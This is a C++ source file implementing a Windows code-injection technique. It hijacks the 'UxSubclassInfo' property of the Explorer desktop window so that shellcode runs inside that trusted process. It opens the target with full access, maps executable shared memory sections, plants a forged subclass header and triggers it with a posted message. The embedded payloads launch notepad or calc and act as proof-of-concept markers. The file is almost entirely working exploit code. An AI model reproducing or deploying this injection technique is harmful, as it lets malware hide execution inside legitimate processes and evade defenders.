#include <windows.h>
#include <iostream>
#include "ntddk.h"

//#pragma comment(linker,"/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

typedef LRESULT(CALLBACK* SUBCLASSPROC)(
    HWND      hWnd,
    UINT      uMsg,
    WPARAM    wParam,
    LPARAM    lParam,
    UINT_PTR  uIdSubclass,
    DWORD_PTR dwRefData);

typedef struct _SUBCLASS_CALL {
    SUBCLASSPROC pfnSubclass;    // subclass procedure
    WPARAM       uIdSubclass;    // unique subclass identifier
    DWORD_PTR    dwRefData;      // optional ref data
} SUBCLASS_CALL, PSUBCLASS_CALL;

typedef struct _SUBCLASS_FRAME {
    UINT                    uCallIndex;   // index of next callback to call
    UINT                    uDeepestCall; // deepest uCallIndex on stack
    struct _SUBCLASS_FRAME* pFramePrev;  // previous subclass frame pointer
    struct _SUBCLASS_HEADER* pHeader;     // header associated with this frame
} SUBCLASS_FRAME, PSUBCLASS_FRAME;

typedef struct _SUBCLASS_HEADER {
    UINT           uRefs;        // subclass count
    UINT           uAlloc;       // allocated subclass call nodes
    UINT           uCleanup;     // index of call node to clean up
    DWORD          dwThreadId;   // thread id of window we are hooking
    SUBCLASS_FRAME* pFrameCur;   // current subclass frame pointer
    SUBCLASS_CALL  CallArray[1]; // base of packed call node array
} SUBCLASS_HEADER, * PSUBCLASS_HEADER;


int propagate(LPVOID shellcode, DWORD payloadSize)
{

    SIZE_T size = 4096;
    LARGE_INTEGER sectionSize = { size };
    LARGE_INTEGER sectionSize2 = { size };

    HANDLE hToTargetProc;
    CLIENT_ID clientID;
    HANDLE SectionObject;
    HANDLE SectionObject2;
    HMODULE hNtDll;
    OBJECT_ATTRIBUTES objectAttributes;
    CHAR winName[256];
    LPCWSTR ccsubClass = L"UxSubclassInfo";
    DWORD processID = 0;
    SUBCLASS_HEADER sh;
    HWND pwh, cwh;
    SIZE_T rd;
    LPVOID pToViewTarget2 = NULL;
    objectAttributes = {};

    clientID = {};

    ShowWindow(GetActiveWindow(), SW_HIDE);

    pwh = FindWindow(TEXT("Progman"), NULL);

    cwh = GetWindow(pwh, GW_CHILD);

    HANDLE p = GetPropW(cwh, ccsubClass);

    HANDLE currentProc = GetCurrentProcess();
    GetWindowThreadProcessId(cwh, &processID);

    clientID.UniqueProcess = (HANDLE)processID;
    
    hToTargetProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, processID);

    if (NtCreateSection(&SectionObject2, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize2, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0) >= 0)
    {

        SIZE_T SectionOffset;
        LPVOID lpToCurrentProc2 = NULL;
        if (ZwMapViewOfSection(SectionObject2, currentProc, &lpToCurrentProc2, NULL, NULL, NULL, &size, ViewShare, NULL, PAGE_EXECUTE_READWRITE) >= 0)
        {
            
            if (ZwMapViewOfSection(SectionObject2, hToTargetProc, &pToViewTarget2, NULL, NULL, NULL, &size, ViewShare, NULL, PAGE_EXECUTE_READWRITE) >= 0)
            {
                memcpy((BYTE*)lpToCurrentProc2, shellcode, payloadSize);
            }
            else
                return -1;

        }
        else
            return -1;

    }
    else
        return 1;


    if (NtCreateSection(&SectionObject, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0) >= 0)
    {

        HANDLE currentProc = GetCurrentProcess();
        SIZE_T SectionOffset;
        LPVOID lpToCurrentProc = NULL;
        if (ZwMapViewOfSection(SectionObject, currentProc, &lpToCurrentProc, NULL, NULL, NULL, &size, ViewShare, NULL, PAGE_EXECUTE_READWRITE) >= 0)
        {
            LPVOID pToViewTarget = NULL;
            if (ZwMapViewOfSection(SectionObject, hToTargetProc, &pToViewTarget, NULL, NULL, NULL, &size, ViewShare, NULL, PAGE_EXECUTE_READWRITE) >= 0)
            {
                sh = { };
                sh.uRefs = 1;
                sh.CallArray[0].pfnSubclass = *((SUBCLASSPROC)pToViewTarget2);
                memcpy(lpToCurrentProc, &sh, sizeof(sh));
                if (SetPropW(cwh, ccsubClass, pToViewTarget))
                {
                    PostMessageW(cwh, WM_SETFOCUS, 0, 0);
                    SetPropW(cwh, ccsubClass, p);
                }
                else
                    return -1;
            }
            else
                return -1;
        }
        else
            return -1;
    }
    else
        return -1;

    return 0;
}
int main()
{
    /*
    unsigned char shellcode[] =
        "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
        "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
        "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
        "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
        "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
        "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
        "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
        "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
        "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
        "\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
        "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
        "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
        "\x52\xff\xd0";
    */
    //Open notepad.exe
    unsigned char shellcode[] = 
        "\x48\x8B\xC4\x48\x83\xEC\x48\x48\x8D\x48\xD8\xC7\x40\xD8\x57\x69\x6E\x45\xC7\x40\xDC\x78\x65\x63\x00\xC7\x40\xE0\x6E\x6F\x74\x65"
        "\xC7\x40\xE4\x70\x61\x64\x00\xE8\xB0\x00\x00\x00\x48\x85\xC0\x74\x0C\xBA\x05\x00\x00\x00\x48\x8D\x4C\x24\x28\xFF\xD0\x33\xC0\x48"
        "\x83\xC4\x48\xC3\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x54\x41\x56\x41\x57\x48\x83\xEC"
        "\x20\x48\x63\x41\x3C\x48\x8B\xD9\x4C\x8B\xE2\x8B\x8C\x08\x88\x00\x00\x00\x85\xC9\x74\x37\x48\x8D\x04\x0B\x8B\x78\x18\x85\xFF\x74"
        "\x2C\x8B\x70\x1C\x44\x8B\x70\x20\x48\x03\xF3\x8B\x68\x24\x4C\x03\xF3\x48\x03\xEB\xFF\xCF\x49\x8B\xCC\x41\x8B\x14\xBE\x48\x03\xD3"
        "\xE8\x87\x00\x00\x00\x85\xC0\x74\x25\x85\xFF\x75\xE7\x33\xC0\x48\x8B\x5C\x24\x40\x48\x8B\x6C\x24\x48\x48\x8B\x74\x24\x50\x48\x8B"
        "\x7C\x24\x58\x48\x83\xC4\x20\x41\x5F\x41\x5E\x41\x5C\xC3\x0F\xB7\x44\x7D\x00\x8B\x04\x86\x48\x03\xC3\xEB\xD4\xCC\x48\x89\x5C\x24"
        "\x08\x57\x48\x83\xEC\x20\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\xF9\x45\x33\xC0\x48\x8B\x50\x18\x48\x8B\x5A\x10\xEB\x16\x4D"
        "\x85\xC0\x75\x1A\x48\x8B\xD7\x48\x8B\xC8\xE8\x35\xFF\xFF\xFF\x48\x8B\x1B\x4C\x8B\xC0\x48\x8B\x43\x30\x48\x85\xC0\x75\xE1\x48\x8B"
        "\x5C\x24\x30\x49\x8B\xC0\x48\x83\xC4\x20\x5F\xC3\x44\x8A\x01\x45\x84\xC0\x74\x1A\x41\x8A\xC0\x48\x2B\xCA\x44\x8A\xC0\x3A\x02\x75"
        "\x0D\x48\xFF\xC2\x8A\x04\x11\x44\x8A\xC0\x84\xC0\x75\xEC\x0F\xB6\x0A\x41\x0F\xB6\xC0\x2B\xC1\xC3";

    propagate(shellcode, sizeof(shellcode));
    
    
    return 0;
}
